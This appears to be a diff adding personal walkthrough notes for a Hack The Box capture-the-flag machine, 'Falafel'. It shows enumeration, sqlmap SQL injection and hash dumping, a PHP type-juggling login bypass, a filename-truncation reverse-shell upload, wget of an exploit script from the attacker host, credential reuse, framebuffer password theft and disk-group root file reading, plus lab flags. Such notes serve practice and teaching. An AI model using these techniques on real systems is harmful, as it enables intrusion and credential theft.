@@ -1,0 +1,245 @@
+nmap -sC -sV -oN nmap 10.10.10.73 -v -A
+
+ports 80 and 22
+
+site shows `Please send any bug reports to the IT staff at IT@falafel.htb`
+-> could try some phishing
+
+ssh version is
+`OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)`
+-> `OpenSSH 7.2p2 - Username Enumeration  | linux/remote/40136.py`
+
+rename it to ssh_user_enum.py
+-> `python ssh_user_enum.py -U /usr/share/wordlists/metasploit/namelist.txt 10.10.10.73`
+-> no result
+
+login page
+`test:test` -> `Try again...`
+`'or''=':'or''='` -> `Wrong identification : admin`
+
+=> there is an `admin` user, now have a way of enumerating users if needed
+
+lets try that phishing idea on `IT@falafel.htb`
+-> port 25 not open and a 'real' mail does not work as IT@... does not exist
+
+robots.txt: disallow .txt -> lets gobuster on .txt extension as dirb is too slow with a larger wordlists
+```
+$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -u http://10.10.10.73
+...
+/index.php (Status: 200)
+/images (Status: 301)
+/login.php (Status: 200)
+/profile.php (Status: 302)
+/uploads (Status: 301)
+/header.php (Status: 200)
+/assets (Status: 301)
+/footer.php (Status: 200)
+/upload.php (Status: 302)
+/css (Status: 301)
+/style.php (Status: 200)
+/js (Status: 301)
+/logout.php (Status: 302)
+/robots.txt (Status: 200)
+/cyberlaw.txt (Status: 200)
+/connection.php (Status: 200)
+```
+
+cyberlaw.txt:
+```
+...
+A user named "chris" has informed me that he could log into MY account without knowing the password,
+then take FULL CONTROL of the website using the image upload feature.
+We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
+so I have no idea how he did it.
+...
+```
+
+lets try sql injection on login page with sqlmap because it worked earlier
+`sqlmap -r login_request --level=5 --risk=3 --dbs -p username,password --batch`
+-> nothing
+
+BUT we know that if username is ok -> "Wrong identification" instead of "Try again"
+lets precise it to sqlmap + we know that is `mysql` bc `' OR '1'='1' --` works
+`sqlmap -r login_request --level 5 --risk 3 -p username,password --batch --dbms mysql --string "Wrong identification" --dbs`
+
+```
+available databases [2]:
+[*] falafel
+[*] information_schema
+```
+
+-> lets dig
+
+```
+$ sqlmap -r login_request --level 5 --risk 3 -p username,password --batch --dbms mysql --string "Wrong identification" -D falafel -T users --dump
+...
++----+--------+---------------------------------------------+----------+
+| ID | role   | password                                    | username |
++----+--------+---------------------------------------------+----------+
+| 1  | admin  | 0e462096931906507119562988736854            | admin    |
+| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |
++----+--------+---------------------------------------------+----------+
+```
+
+i can now login with `chris:juggling` on site (cant ssh tho)
+
+```
+Hey, my name is chris, and I work at the local circus as a juggler. After work, I always eat falafel.
+By night, I pentest random websites as a hobby. It's funny how sometimes both the hobby and work have something in common..
+```
+
+-> type juggling in php? and admin hash starts with `0e` + numbers
+https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+
+```
+$ echo -n 0e215962017 | md5sum
+0e291242476940776845150308577824
+```
+
+login with `admin:0e215962017` -> login successful!
+can now upload img
+upload .php.png -> not executed
+
+tried some command injection with
+'file.png; id;.png' or 'file'\''; id;.png' but cant escape from wget
+
+lets try to upload something to /home/chris/.ssh/
+https://www.exploit-db.com/exploits/40064 -> cant make it work bc of the `cd` before
+
+i come back on uploading a rev shell, searching for a way to exploit the `wget` usage:
+https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick
+`mv php-reverse-shell.php $(python -c 'print("A"*(236-4)+".php"+".png")')`
+
+start server and upload the renamed shell then start listener and visit the upload url:
+http://10.10.10.73/uploads/0820-2251_51faa67b452c8643/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
+
+-> shell as `www-data`!
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+```
+$ cat /var/www/html/connection.php
+<?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafelIsReallyTasty');
+   define('DB_DATABASE', 'falafel');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+   // Check connection
+   if (mysqli_connect_errno())
+   {
+      echo "Failed to connect to MySQL: " . mysqli_connect_error();
+   }
+?>
+```
+
+su moshe with `falafelIsReallyTasty`
+
+user flag:
+c866575ed5999e1a878b1494fcb1f9d3
+
+cant run sudo and suid files arent suspicious
+-> lets upload enumeration script like linpeas.sh
+
+```
+yossi    tty1                          Thu Aug 20 20:10   still logged in
+```
+
+```
+/bin/ntfs-3g		--->	Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+```
+
+before looking at this, lets check sql db:
+`mysqldump -umoshe -pfalafelIsReallyTasty falafel` -> lock table error
+https://michaelrigart.be/mysqldump-1044-access-denied-using-lock-tables/
+`mysqldump --single-transaction -umoshe -pfalafelIsReallyTasty falafel`
+-> nothing more than with sqlmap
+
+lets look at this ntfs-3g potential exploit:
+https://www.exploit-db.com/exploits/41356 -> explanations
+https://www.exploit-db.com/exploits/41240 -> exploit itself
+
+wget http://10.10.14.23/cve-2017-0358.sh
+bash cve-2017-0358.sh
+-> cant make it work...
+
+lets finally take a look at
+```
+yossi    tty1                          Thu Aug 20 20:10   still logged in
+```
+and
+```
+uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+```
+
+strange group `video` and yossi is physically logged in, which is weird on an htb machine...
+-> https://www.kernel.org/doc/Documentation/fb/framebuffer.txt
+
+```
+The frame buffer devices are also `normal' memory devices, this means, you can
+read and write their contents. You can, for example, make a screen snapshot by
+
+  cp /dev/fb0 myfile
+```
+
+lets check it -> download it on host
+
+```
+$ file fb0
+fb0: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha "\001"
+```
+
+open it with gimp -> doesnt work, even with .tga extension
+solution is to load as `raw image data` to change correct parameters following informations in
+`/sys/class/graphics/fb0` on TARGET -> bc it's a screen taken on TARGET screen so target's dimsensions
+
+we can see yossi changed his passwd to
+`MoshePlzStopHackingMe!` -> we are yossi
+
+```
+yossi@falafel:/tmp/yossi$ find / -perm -u=s 2>/dev/null
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/ping6
+/bin/su
+```
+
+-> lets try some pkexec suid exploit
+https://www.exploit-db.com/exploits/17942
+compile it on hoist and dl it on target -> doesnt work
+
+lets enumerate with linpeas again
+
+```
+User & Groups: uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
+```
+
+`disk` group is a "99% a PE vector" according to linpeas
+https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html#disk
+
+```
+$ debugfs /dev/sda1`
+debugfs 1.42.13 (17-May-2015)
+debugfs:  cat /root/root.txt
+23b79200448c62ffd6f8f2091c001fa1
+```
+
+root flag:
+`23b79200448c62ffd6f8f2091c001fa1`
